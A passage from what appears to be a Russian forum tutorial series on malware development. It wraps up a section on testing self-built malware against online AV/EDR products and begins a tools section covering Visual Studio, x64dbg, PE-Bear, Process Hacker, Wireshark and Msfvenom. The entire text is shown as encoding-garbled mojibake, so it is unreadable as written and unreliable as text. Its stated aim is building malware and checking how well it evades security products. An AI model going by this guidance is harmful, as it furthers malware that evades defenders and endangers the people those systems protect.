–•–æ—Ç—è —Ç–∞–∫–æ–µ –æ—Ç–∫–ª—é—á–µ–Ω–∏–µ –Ω–µ –ø–æ–∑–≤–æ–ª–∏—Ç –≤ –ø–æ–ª–Ω–æ–π –º–µ—Ä–µ –ø—Ä–æ—Ç–µ—Å—Ç–∏—Ä–æ–≤–∞—Ç—å –∑–∞—â–∏—Ç—É.<br />
<br />
4. –û–Ω–ª–∞–π–Ω-—Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ AV/EDR. –ó–∞–ø—É—Å—Ç–∏—Ç–µ —Ä–∞–∑—Ä–∞–±–æ—Ç–∞–Ω–Ω–æ–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–µ –ü–û –ø—Ä–æ—Ç–∏–≤ –ø—Ä–æ–¥—É–∫—Ç–æ–≤ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏, –ø–æ–¥–∫–ª—é—á–µ–Ω–Ω—ã—Ö –∫ –ò–Ω—Ç–µ—Ä–Ω–µ—Ç—É. –û–±–ª–∞—á–Ω—ã–µ –¥–≤–∏–∂–∫–∏ —á–∞—Å—Ç–æ —è–≤–ª—è—é—Ç—Å—è –∫–ª—é—á–µ–≤—ã–º–∏ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–æ–≤ –≤ AV/EDR, <b>–∏ –ø–æ—ç—Ç–æ–º—É —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –≤–∞—à–µ–≥–æ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ü–û –Ω–∞ —ç—Ç–∏ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç—ã –∏–º–µ–µ—Ç —Ä–µ—à–∞—é—â–µ–µ –∑–Ω–∞—á–µ–Ω–∏–µ –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –±–æ–ª–µ–µ —Ç–æ—á–Ω—ã—Ö —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤.</b><br />
–ë—É–¥—å—Ç–µ –æ—Å—Ç–æ—Ä–æ–∂–Ω—ã —Ç–∞–∫ –∫–∞–∫ —ç—Ç–æ—Ç —à–∞–≥ –º–æ–∂–µ—Ç –ø—Ä–∏–≤–µ—Å—Ç–∏ –∫ –æ—Ç–ø—Ä–∞–≤–∫–µ –≤ –æ–±—Ä–∞–∑—Ü–æ–≤ –≤ –æ–±–ª–∞—á–Ω—ã–π –º–µ—Ö–∞–Ω–∏–∑–º —Ä–µ—à–µ–Ω–∏—è –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏.<br />
<br />
5. –ê–Ω–∞–ª–∏–∑. –ù–∞ —ç—Ç–æ–º —ç—Ç–∞–ø–µ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –ø–æ–Ω—è—Ç—å –∫–∞–∫–∏–µ —Å—Ä–µ–¥—Å—Ç–≤–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –±–ª–æ–∫–∏—Ä—É—é—Ç –≤–∞—à–µ –ü–û, –Ω–∞ —Å–∫–æ–ª—å–∫–æ —ç—Ç–æ –∫—Ä–∏—Ç–∏—á–Ω–æ –∏ —Ç.–¥.<br />
<br />
–ù–∞ —ç—Ç–æ–º –∑–∞–∫–æ–Ω—á—É!)<br />
<br />
–ü–∏—à–∏—Ç–µ –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏–∏, —Å–ª–µ–¥—É—é—â–∏–µ —Å—Ç–∞—Ç—å–∏ –±—É–¥—É—Ç –±–æ–ª–µ–µ –ø—Ä–µ–¥–º–µ—Ç–Ω—ã–º–∏, —Ä–∞–∑–±–µ—Ä—ë–º –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏, –ø–æ—Ç–æ–º –±—É–¥–µ—Ç –Ω–µ–±–æ–ª—å—à–∞—è —Å—Ç–∞—Ç—å—è –ø–æ –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–µ –≤–∏–Ω–¥—ã –∏ –≤–ø–µ—Ä—ë–¥.</div>

						

							<h2>–ò–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã</h2>

							

							

							<div class="bbWrapper">–í –ø—Ä–µ–¥—ã–¥—É—â–µ–π —á–∞—Å—Ç–∏ –º—ã –∑–∞—Ç—Ä–æ–Ω—É–ª–∏, –∑–∞—á–µ–º –≤–æ–æ–±—â–µ —Ä–∞–∑—Ä–∞–±–∞—Ç—ã–≤–∞—Ç—å –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–µ –ü–û, —Ä–∞—Å—Å–º–æ—Ç—Ä–µ–ª–∏ –∂–∏–∑–Ω–µ–Ω–Ω—ã–π —Ü–∏–∫–ª —Ç–∞–∫–æ–≥–æ –ü–û –∏ –Ω–µ–º–Ω–æ–≥–æ –∑–∞—Ç—Ä–æ–Ω—É–ª–∏ –≤—ã–±–æ—Ä —è–∑—ã–∫–∞ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏.<br />
<br />
<br />
<br />
–ü–µ—Ä–µ–¥ –Ω–∞—á–∞–ª–æ–º –ø—É—Ç–µ—à–µ—Å—Ç–≤–∏—è –ø–æ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ–≥–æ –æ–±–µ—Å–ø–µ—á–µ–Ω–∏—è –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –ø–æ–¥–≥–æ—Ç–æ–≤–∏—Ç—å —Ä–∞–±–æ—á–µ–µ –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–æ, —É—Å—Ç–∞–Ω–æ–≤–∏–≤ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã –¥–ª—è —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º, –∞ —Ç–∞–∫–∂–µ –∏—Ö –æ—Ç–ª–∞–¥–∫–∏.<br />
<br />
–≠—Ç–∏ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã –±—É–¥—É—Ç –ø–æ–ª–µ–∑–Ω—ã –≤ –ø—Ä–æ—Ü–µ—Å—Å–µ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏ –∏ –∞–Ω–∞–ª–∏–∑–∞ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ–≥–æ –æ–±–µ—Å–ø–µ—á–µ–Ω–∏—è.<br />
<br />
–û—Ç–º–µ—á—É —á—Ç–æ –ø–æ–∫–∞ –º—ã –±—É–¥–µ–º —Ä–∞—Å—Å–º–∞—Ç—Ä–∏–≤–∞—Ç—å –û–° Windows, —Ç.–∫. –±–æ–ª—å—à–∏–Ω—Å—Ç–≤–æ –º–∞–ª–≤–∞—Ä–∏ –ø–∏—à—É—Ç –∏–º–µ–Ω–Ω–æ –ø–æ–¥ —ç—Ç—É –û–°, –Ω–æ —Ç–∞–∫–∂–µ –≤ –±—É–¥—É—â–µ–º —Ö–æ—á—É –∑–∞—Ç—Ä–æ–Ω—É—Ç—å –õ–∏–Ω—É–∫—Å –∏ –º–æ–∂–µ—Ç-–±—ã—Ç—å –Ω–µ—Å–∫–æ–ª—å–∫–æ —Å—Ç–∞—Ç–µ–π –±—É–¥—É—Ç –∑–∞—Ç—Ä–∞–≥–∏–≤–∞—Ç—å –æ–±—Å—É–∂–¥–µ–Ω–∏–µ –º–∞–ª–≤–∞—Ä–∏ –¥–ª—è –º–æ–±–∏–ª—å–Ω—ã—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤.)<br />
<br />
<b>–ò–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏/–æ—Ç–ª–∞–¥–∫–∏ –∏ –∏—Å—Å–ª–µ–¥–æ–≤–∞–Ω–∏—è –ø—Ä–æ–≥—Ä–∞–º–º</b><br />
<br />
–£—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ —Å–ª–µ–¥—É—é—â–∏–µ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã:<br />
<br />
<b>Visual Studio</b> - —ç—Ç–æ —Å—Ä–µ–¥–∞ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏, –≤ –∫–æ—Ç–æ—Ä–æ–π –±—É–¥–µ—Ç –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å –Ω–∞–ø–∏—Å–∞–Ω–∏—è –∏ –∫–æ–º–ø–∏–ª—è—Ü–∏–∏ –∫–æ–¥–∞. –£—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ C/C++ Runtime.<br />
<br />
<b>x64dbg - x64dbg</b> - —ç—Ç–æ –æ—Ç–ª–∞–¥—á–∏–∫, –∫–æ—Ç–æ—Ä—ã–π –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –≤–æ –≤—Å–µ—Ö —Å–ª–µ–¥—É—é—â–∏—Ö —Å—Ç–∞—Ç—å—è—Ö –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –≤–Ω—É—Ç—Ä–µ–Ω–Ω–µ–≥–æ –ø–æ–Ω–∏–º–∞–Ω–∏—è —Ä–∞–∑—Ä–∞–±–æ—Ç–∞–Ω–Ω–æ–π –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–π –ø—Ä–æ–≥—Ä–∞–º–º—ã.<br />
<br />
<b>PE-Bear - PE-bear </b>- —ç—Ç–æ –º–Ω–æ–≥–æ—Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª—å–Ω—ã–π –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –æ–±—Ä–∞—Ç–Ω–æ–π —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏ –¥–ª—è —Ñ–∞–π–ª–æ–≤ –†–ï. –û–Ω —Ç–∞–∫–∂–µ –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –¥–ª—è –æ—Ü–µ–Ω–∫–∏ —Ä–∞–∑—Ä–∞–±–æ—Ç–∞–Ω–Ω–æ–π –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–π –ø—Ä–æ–≥—Ä–∞–º–º—ã –∏ –ø–æ–∏—Å–∫–∞ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã—Ö –ø—Ä–∏–∑–Ω–∞–∫–æ–≤.<br />
<br />
<b>Process Hacker 2 </b>- Process Hacker - —ç—Ç–æ –º–æ—â–Ω—ã–π —É–Ω–∏–≤–µ—Ä—Å–∞–ª—å–Ω—ã–π –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–º–æ–≥–∞–µ—Ç –æ—Ç—Å–ª–µ–∂–∏–≤–∞—Ç—å —Ä–µ—Å—É—Ä—Å—ã —Å–∏—Å—Ç–µ–º—ã, –æ—Ç–ª–∞–∂–∏–≤–∞—Ç—å –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ–µ –æ–±–µ—Å–ø–µ—á–µ–Ω–∏–µ –∏ –æ–±–Ω–∞—Ä—É–∂–∏–≤–∞—Ç—å –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã.<br />
<br />
<b>Wireshark</b> ‚Äì —ç—Ç–æ —à–∏—Ä–æ–∫–æ —Ä–∞—Å–ø—Ä–æ—Å—Ç—Ä–∞–Ω—ë–Ω–Ω—ã–π –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–ª—è –∑–∞—Ö–≤–∞—Ç–∞ –∏ –∞–Ω–∞–ª–∏–∑–∞ —Å–µ—Ç–µ–≤–æ–≥–æ —Ç—Ä–∞—Ñ–∏–∫–∞, –∫–æ—Ç–æ—Ä—ã–π –∞–∫—Ç–∏–≤–Ω–æ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –∫–∞–∫ –¥–ª—è –æ–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã—Ö —Ü–µ–ª–µ–π, —Ç–∞–∫ –∏ –¥–ª—è —É—Å—Ç—Ä–∞–Ω–µ–Ω–∏—è –Ω–µ–ø–æ–ª–∞–¥–æ–∫ –Ω–∞ –∫–æ–º–ø—å—é—Ç–µ—Ä–µ –∏–ª–∏ –≤ —Å–µ—Ç–∏.<br />
<br />
<b>Msfvenom</b> - —ç—Ç–æ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞ –∫–æ–º–∞–Ω–¥–Ω–æ–π —Å—Ç—Ä–æ–∫–∏, –∫–æ—Ç–æ—Ä—ã–π –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –ø—ç–π–ª–æ–∞–¥–æ–≤ –¥–ª—è —Ä–∞–∑–Ω—ã—Ö –ø–ª–∞—Ç—Ñ–æ—Ä–º.<br />
<br />
<b>–†–∞—Å—Å–º–æ—Ç—Ä–∏–º —ç—Ç–∏ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã –±–æ–ª–µ–µ –ø–æ–¥—Ä–æ–±–Ω–æ:<br />
<br />
Visual Studio</b> - —ç—Ç–æ –∏–Ω—Ç–µ–≥—Ä–∏—Ä–æ–≤–∞–Ω–Ω–∞—è —Å—Ä–µ–¥–∞ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏ (IDE), —Ä–∞–∑—Ä–∞–±–æ—Ç–∞–Ω–Ω–∞—è Microsoft. –û–Ω–∞ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏ —à–∏—Ä–æ–∫–æ–≥–æ —Å–ø–µ–∫—Ç—Ä–∞ –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ–≥–æ –æ–±–µ—Å–ø–µ—á–µ–Ω–∏—è, —Ç–∞–∫–æ–≥–æ –∫–∞–∫ –≤–µ–±-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è, –≤–µ–±-—Å–µ—Ä–≤–∏—Å—ã –∏ –∫–æ–º–ø—å—é—Ç–µ—Ä–Ω—ã–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã.<br />
<br />
–û–Ω —Ç–∞–∫–∂–µ –ø–æ—Å—Ç–∞–≤–ª—è–µ—Ç—Å—è —Å –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞–º–∏ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏ –∏ –æ—Ç–ª–∞–¥–∫–∏ –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –∏ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π.<br />
<br />
Visual Studio –±—É–¥–µ—Ç –æ—Å–Ω–æ–≤–Ω–æ–π —Å—Ä–µ–¥–æ–π —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏, –∏—Å–ø–æ–ª—å–∑—É–µ–º–æ–π –≤ —ç—Ç–æ–º –∫—É—Ä—Å–µ.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746701868040.png"
		data-src="https://osint42.org/attachments/1746701868040-png.14/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746701868040-png.14/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746701868040.png"
			title="1746701868040.png"
			width="973" height="659" loading="lazy" />
	</div><br />
<br />
<br />
<br />
<br />
<b>x64dbg</b> - —ç—Ç–æ –æ—Ç–ª–∞–¥–æ—á–Ω–∞—è —É—Ç–∏–ª–∏—Ç–∞ —Å –æ—Ç–∫—Ä—ã—Ç—ã–º –∏—Å—Ö–æ–¥–Ω—ã–º –∫–æ–¥–æ–º –¥–ª—è x64 –∏ x86 –±–∏–Ω–∞—Ä–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤ Windows.<br />
<br />
–û–Ω–∞ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –∞–Ω–∞–ª–∏–∑–∞ –∏ –æ—Ç–ª–∞–¥–∫–∏ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–π –≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–º —Ä–µ–∂–∏–º–µ –∏ –¥—Ä–∞–π–≤–µ—Ä–æ–≤ –≤ —Ä–µ–∂–∏–º–µ —è–¥—Ä–∞.<br />
<br />
–û–Ω–∞ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ—Ç –≥—Ä–∞—Ñ–∏—á–µ—Å–∫–∏–π –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–∑–≤–æ–ª—è–µ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º –ø—Ä–æ–≤–µ—Ä—è—Ç—å –∏ –∞–Ω–∞–ª–∏–∑–∏—Ä–æ–≤–∞—Ç—å —Å–æ—Å—Ç–æ—è–Ω–∏–µ —Å–≤–æ–∏—Ö –ø—Ä–æ–≥—Ä–∞–º–º, –ø—Ä–æ—Å–º–∞—Ç—Ä–∏–≤–∞—Ç—å —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ –ø–∞–º—è—Ç–∏, –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏ –∞—Å—Å–µ–º–±–ª–µ—Ä–∞ –∏ –∑–Ω–∞—á–µ–Ω–∏—è —Ä–µ–≥–∏—Å—Ç—Ä–æ–≤.<br />
<br />
–° –ø–æ–º–æ—â—å—é x64dbg –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏ –º–æ–≥—É—Ç —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—Ç—å —Ç–æ—á–∫–∏ –æ—Å—Ç–∞–Ω–æ–≤–∞, –ø—Ä–æ—Å–º–∞—Ç—Ä–∏–≤–∞—Ç—å –¥–∞–Ω–Ω—ã–µ —Å—Ç–µ–∫–∞ –∏ –∫—É—á–∏, –≤—ã–ø–æ–ª–Ω—è—Ç—å –ø–æ—à–∞–≥–æ–≤–æ–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–¥–∞, —á–∏—Ç–∞—Ç—å –∏ –∑–∞–ø–∏—Å—ã–≤–∞—Ç—å –∑–Ω–∞—á–µ–Ω–∏—è –ø–∞–º—è—Ç–∏.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746701876262.png"
		data-src="https://osint42.org/attachments/1746701876262-png.15/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746701876262-png.15/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746701876262.png"
			title="1746701876262.png"
			width="974" height="490" loading="lazy" />
	</div><br />
<br />
<br />
<b>PE-Bear</b> - —ç—Ç–æ –±–µ—Å–ø–ª–∞—Ç–Ω—ã–π –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç —Å –æ—Ç–∫—Ä—ã—Ç—ã–º –∏—Å—Ö–æ–¥–Ω—ã–º –∫–æ–¥–æ–º, —Ä–∞–∑—Ä–∞–±–æ—Ç–∞–Ω–Ω—ã–π –¥–ª—è –ø–æ–º–æ—â–∏ –∞–Ω–∞–ª–∏—Ç–∏–∫–∞–º –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ–≥–æ –æ–±–µ—Å–ø–µ—á–µ–Ω–∏—è –∏ –æ–±—Ä–∞—Ç–Ω–æ–π —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–∏ –≤ –±—ã—Å—Ç—Ä–æ–º –∏ –ø—Ä–æ—Å—Ç–æ–º –∞–Ω–∞–ª–∏–∑–µ –∏—Å–ø–æ–ª–Ω—è–µ–º—ã—Ö —Ñ–∞–π–ª–æ–≤ Windows Portable Executable (PE).<br />
<br />
–û–Ω –ø–æ–º–æ–≥–∞–µ—Ç –∞–Ω–∞–ª–∏–∑–∏—Ä–æ–≤–∞—Ç—å –∏ –≤–∏–∑—É–∞–ª–∏–∑–∏—Ä–æ–≤–∞—Ç—å —Å—Ç—Ä—É–∫—Ç—É—Ä—É —Ñ–∞–π–ª–∞ PE, –ø—Ä–æ—Å–º–∞—Ç—Ä–∏–≤–∞—Ç—å –∏–º–ø–æ—Ä—Ç—ã –∏ —ç–∫—Å–ø–æ—Ä—Ç—ã –∫–∞–∂–¥–æ–≥–æ –º–æ–¥—É–ª—è –∏ –≤—ã–ø–æ–ª–Ω—è—Ç—å —Å—Ç–∞—Ç–∏—á–µ—Å–∫–∏–π –∞–Ω–∞–ª–∏–∑ –¥–ª—è –æ–±–Ω–∞—Ä—É–∂–µ–Ω–∏—è –∞–Ω–æ–º–∞–ª–∏–π –∏ –≤–æ–∑–º–æ–∂–Ω–æ–≥–æ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –∫–æ–¥–∞. PE-bear —Ç–∞–∫–∂–µ –≤–∫–ª—é—á–∞–µ—Ç —Ñ—É–Ω–∫—Ü–∏–∏ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∑–∞–≥–æ–ª–æ–≤–∫–∞ PE –∏ —Å–µ–∫—Ü–∏–π, –∞ —Ç–∞–∫–∂–µ —à–µ—Å—Ç–Ω–∞–¥—Ü–∞—Ç–µ—Ä–∏—á–Ω–æ–≥–æ —Ä–µ–¥–∞–∫—Ç–æ—Ä–∞.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746701886606.png"
		data-src="https://osint42.org/attachments/1746701886606-png.16/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746701886606-png.16/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746701886606.png"
			title="1746701886606.png"
			width="974" height="600" loading="lazy" />
	</div><br />
<br />
<br />
<b>Process Hacker</b> - —ç—Ç–æ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç —Å –æ—Ç–∫—Ä—ã—Ç—ã–º –∏—Å—Ö–æ–¥–Ω—ã–º –∫–æ–¥–æ–º –¥–ª—è –ø—Ä–æ—Å–º–æ—Ç—Ä–∞ –∏ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–∞–º–∏ –∏ —Å–ª—É–∂–±–∞–º–∏ –≤ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º–µ Windows.<br />
<br />
–û–Ω –ø–æ—Ö–æ–∂ –Ω–∞ –¥–∏—Å–ø–µ—Ç—á–µ—Ä –∑–∞–¥–∞—á, –Ω–æ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ—Ç –±–æ–ª—å—à–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –∏ —Ä–∞—Å—à–∏—Ä–µ–Ω–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏.<br />
<br />
–° –µ–≥–æ –ø–æ–º–æ—â—å—é –º–æ–∂–Ω–æ –∑–∞–≤–µ—Ä—à–∞—Ç—å –ø—Ä–æ—Ü–µ—Å—Å—ã –∏ —Å–ª—É–∂–±—ã, –ø—Ä–æ—Å–º–∞—Ç—Ä–∏–≤–∞—Ç—å –ø–æ–¥—Ä–æ–±–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –∏ —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É –æ –ø—Ä–æ—Ü–µ—Å—Å–∞—Ö, —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—Ç—å –ø—Ä–∏–æ—Ä–∏—Ç–µ—Ç—ã –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ –∏ –º–Ω–æ–≥–æ–µ –¥—Ä—É–≥–æ–µ.<br />
<br />
Process Hacker –±—É–¥–µ—Ç –ø–æ–ª–µ–∑–µ–Ω –ø—Ä–∏ –∞–Ω–∞–ª–∏–∑–µ —Ä–∞–±–æ—Ç–∞—é—â–∏—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ –¥–ª—è –ø—Ä–æ—Å–º–æ—Ç—Ä–∞ —Ç–∞–∫–∏—Ö —ç–ª–µ–º–µ–Ω—Ç–æ–≤, –∫–∞–∫ –∑–∞–≥—Ä—É–∂–µ–Ω–Ω—ã–µ DLL-–±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –∏ –æ–±–ª–∞—Å—Ç–∏ –ø–∞–º—è—Ç–∏.<br />
<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746701914033.png"
		data-src="https://osint42.org/attachments/1746701914033-png.19/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746701914033-png.19/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746701914033.png"
			title="1746701914033.png"
			width="974" height="675" loading="lazy" />
	</div><br />
<br />
<br />
<br />
<b>Wireshark</b> ‚Äì —ç—Ç–æ —à–∏—Ä–æ–∫–æ —Ä–∞—Å–ø—Ä–æ—Å—Ç—Ä–∞–Ω—ë–Ω–Ω—ã–π –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–ª—è –∑–∞—Ö–≤–∞—Ç–∞ –∏ –∞–Ω–∞–ª–∏–∑–∞ —Å–µ—Ç–µ–≤–æ–≥–æ —Ç—Ä–∞—Ñ–∏–∫–∞, –∫–æ—Ç–æ—Ä—ã–π –∞–∫—Ç–∏–≤–Ω–æ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –∫–∞–∫ –¥–ª—è –æ–±—Ä–∞–∑–æ–≤–∞—Ç–µ–ª—å–Ω—ã—Ö —Ü–µ–ª–µ–π, —Ç–∞–∫ –∏ –¥–ª—è —É—Å—Ç—Ä–∞–Ω–µ–Ω–∏—è –Ω–µ–ø–æ–ª–∞–¥–æ–∫ –Ω–∞ –∫–æ–º–ø—å—é—Ç–µ—Ä–µ –∏–ª–∏ –≤ —Å–µ—Ç–∏.<br />
<br />
Wireshark —Ä–∞–±–æ—Ç–∞–µ—Ç –ø—Ä–∞–∫—Ç–∏—á–µ—Å–∫–∏ —Å–æ –≤—Å–µ–º–∏ –ø—Ä–æ—Ç–æ–∫–æ–ª–∞–º–∏ –º–æ–¥–µ–ª–∏ OSI, –æ–±–ª–∞–¥–∞–µ—Ç –ø–æ–Ω—è—Ç–Ω—ã–º –¥–ª—è –æ–±—ã—á–Ω–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–æ–º –∏ —É–¥–æ–±–Ω–æ–π —Å–∏—Å—Ç–µ–º–æ–π —Ñ–∏–ª—å—Ç—Ä–∞—Ü–∏–∏ –¥–∞–Ω–Ω—ã—Ö. –ü–æ–º–∏–º–æ –≤—Å–µ–≥–æ —ç—Ç–æ–≥–æ, –ø—Ä–æ–≥—Ä–∞–º–º–∞ —è–≤–ª—è–µ—Ç—Å—è –∫—Ä–æ—Å—Å–ø–ª–∞—Ç—Ñ–æ—Ä–º–µ–Ω–Ω–æ–π –∏ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç —Å–ª–µ–¥—É—é—â–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω—ã–µ —Å–∏—Å—Ç–µ–º—ã: Windows, Linux, Mac OS X, Solaris, FreeBSD, NetBSD, OpenBSD.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746703268574.png"
		data-src="https://osint42.org/attachments/1746703268574-png.20/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746703268574-png.20/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746703268574.png"
			title="1746703268574.png"
			width="978" height="726" loading="lazy" />
	</div><br />
<br />
<br />
<b>Msfvenom</b> - —ç—Ç–æ –≥–µ–Ω–µ—Ä–∞—Ç–æ—Ä –Ω–µ–∑–∞–≤–∏—Å–∏–º—ã—Ö –Ω–∞–≥—Ä—É–∑–æ–∫ (payload) —Ñ—Ä–µ–π–º–≤–æ—Ä–∫–∞ Metasploit, –∫–æ—Ç–æ—Ä—ã–π –ø–æ–∑–≤–æ–ª—è–µ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º —Å–æ–∑–¥–∞–≤–∞—Ç—å —Ä–∞–∑–ª–∏—á–Ω—ã–µ —Ç–∏–ø—ã –Ω–∞–≥—Ä—É–∑–æ–∫.<br />
<br />
